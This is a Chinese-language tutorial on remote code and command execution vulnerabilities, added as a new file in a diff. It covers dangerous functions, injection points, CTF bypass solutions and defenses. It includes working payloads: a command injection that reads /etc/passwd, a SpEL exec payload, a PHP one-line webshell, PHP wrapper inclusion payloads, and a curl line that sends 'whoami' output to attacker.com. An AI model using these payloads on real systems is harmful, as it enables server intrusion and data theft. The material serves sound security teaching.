@@ -1,0 +1,153 @@
+引言
+
+在Web安全领域，远程代码/命令执行（Remote Code/Command Execution，RCE）始终占据着高危漏洞榜首。攻击者一旦成功触发RCE，便能在目标服务器上执行任意系统命令或脚本代码，相当于直接拿到了服务器的“操作权”。本文将从底层函数原理、业务触发场景、回显技巧到CTF实战绕过，层层剥开RCE的面纱，帮助读者构建从理论到实践的完整知识体系。
+
+---
+
+一、RCE的两副面孔：代码执行 vs 命令执行
+
+许多人混淆“代码执行”与“命令执行”，实际上二者机制截然不同：
+
+· 代码执行（Code Execution）：应用程序将用户输入当作脚本代码进行解析执行。典型如PHP的eval、Python的eval/exec。
+    本质：语言层面的动态执行。
+· 命令执行（Command Execution）：应用程序调用操作系统命令，而用户输入被拼接进命令字符串。典型如PHP的system、Python的os.system。
+    本质：系统Shell调用。
+
+两者最终都能控制服务器，但利用方式与防御侧重点各异。
+
+---
+
+二、漏洞函数：危险源头一览
+
+不同语言提供“方便”的同时也埋下了地雷：
+
+PHP
+
+· 代码执行：eval()、assert()、preg_replace('/e')、create_function()、数组回调系列（array_map、call_user_func）等。
+· 命令执行：system()、exec()、shell_exec()、passthru()、反引号运算符等。
+
+Python
+
+· 代码执行：eval()、exec()、compile()。
+· 命令执行：os.system、subprocess模块、commands.*（Python2）。
+
+Java
+
+· 无类似eval的直接函数，但反射机制与表达式引擎（OGNL、SpEL、MVEL）成为代码执行的重灾区。例如Spring框架的SpEL表达式注入，可构造T(java.lang.Runtime).getRuntime().exec('calc')。
+
+了解这些函数只是第一步，更重要的是在业务代码中发现它们的影子。
+
+---
+
+三、功能点：RCE的天然温床
+
+1. 在线编程/代码沙箱 —— 代码执行典型场景
+
+很多网站提供“在线运行代码”功能，若未对语言执行环境做严格隔离，用户提交的代码将直接在服务器端执行。黑盒测试时，可尝试提交print(eval(input()))等测试用例。
+
+2. 系统管理面板 —— 命令执行经典入口
+
+网站后台的“网络检测”（ping/traceroute）、“日志导出”、“压缩解压”等功能常直接拼接系统命令。例如：
+ping -c 3 $ip → 若未过滤$ip，传入127.0.0.1; cat /etc/passwd即可执行任意命令。
+
+3. 表达式解析引擎 —— Java系特有风景
+
+如Spring的SpEL在评论解析、权限校验中可能被触发。攻击者只需提交形如T(java.lang.Runtime).getRuntime().exec('calc')的评论，即可触发命令执行。
+
+---
+
+四、从无回显到有回显：信息带出的艺术
+
+RCE最大的痛点在于回显——很多场景下命令输出不会直接显示在页面上。此时需要利用“副作用”将结果带出：
+
+· 写入Web目录：echo '<?php @eval($_POST[1]);?>' > shell.php
+· DNS/HTTP外带：curl http://attacker.com/$(whoami | base64)
+· 延时判断（盲注）：if [ -f /flag ]; then sleep 5; fi
+
+Java环境下还可通过响应头、异常信息、模板引擎输出等通道带出数据。
+
+---
+
+五、其他漏洞引发RCE：链式反应的艺术
+
+RCE经常不是孤立出现的，而是其他漏洞的“升级版”：
+
+· SQL注入写WebShell → 命令执行
+· 文件包含配合伪协议 → 代码执行（见下文CTF部分）
+· 反序列化漏洞 → 触发危险方法/表达式引擎
+· 文件上传绕过 → 上传WebShell
+
+一次完整的渗透往往就是将这些小漏洞串成一条攻击链，最终获得RCE。
+
+---
+
+六、实战复盘：从黑盒测试到CTF白盒
+
+黑盒案例：代码在线运行平台
+
+测试步骤：
+
+1. 提交普通代码（print("hello")）确认功能正常。
+2. 尝试系统命令：print(os.system('id'))（Python）。
+3. 若无回显，尝试写文件：open('/tmp/test','w').write('test')。
+4. 若过滤关键词，尝试编码、拼接、利用语言特性绕过。
+
+白盒CTF经典题解（29~36）
+
+29-通配符绕过
+
+system('tac fla*.php');
+
+· tac反向输出文件，fla*.php匹配flag.php，避开文件名过滤。
+  原理：通配符由Shell解释，不依赖PHP函数过滤。
+
+30-取代函数&通配符&管道符
+
+cp fla*.ph* 2.txt;
+echo shell_exec('tac fla*.ph*');
+
+· 利用cp重命名文件，再用tac读取。fla*.ph*巧妙避开php后缀过滤。
+  绕过思路：寻找替代函数、滥用通配符、管道符。
+
+31-参数逃逸
+
+eval($_GET[1]); 请求：?1=system('tac flag.php');
+
+· 直接注入system()调用，前提是eval参数可控且无过滤。
+
+32~36-配合文件包含&伪协议
+
+核心技巧：include + 伪协议 → 任意代码执行。
+
+· data://：include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
+    将PHP代码嵌入data流，include直接执行。
+· php://filter：include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+    不执行代码，但可读取源码。常用于信息收集。
+
+37~39-包含RCE进阶
+
+· data://直接写<?php system('tac fla*');?>，无需文件上传。
+· php://input：POST数据<?php system('tac flag.php');?>，include时执行。
+  关键：allow_url_include=On是必要条件。
+
+---
+
+七、防御与修复：从源头切断RCE
+
+1. 禁用危险函数
+      PHP可通过disable_functions禁用system、eval等；Python尽量避免eval处理不可信输入。
+2. 输入验证/白名单
+   · 命令执行：对IP、路径等参数严格白名单校验，拒绝任何拼接。
+   · 代码执行：若非必要，不使用动态执行；必须使用时，用沙箱/容器隔离。
+3. 最小权限原则
+      Web服务运行账户不给予写入权限，避免被写WebShell。
+4. 表达式引擎安全配置
+      Java框架应禁用不必要的表达式功能，对用户输入禁用SpEL解析。
+5. WAF与RASP
+      部署Web应用防火墙或运行时应用自我保护，拦截异常函数调用。
+
+---
+
+结语
+
+RCE是Web安全皇冠上的明珠，也是最危险的漏洞之一。理解它的本质——用户输入被意外送入解释器——才能在设计、编码、测试各阶段有效防御。从CTF题目到真实漏洞，攻击手法层出不穷，但万变不离其宗：永远不信任用户输入，永远隔离数据与代码。唯有将理论与实践结合，方能在攻防博弈中立于不败之地。
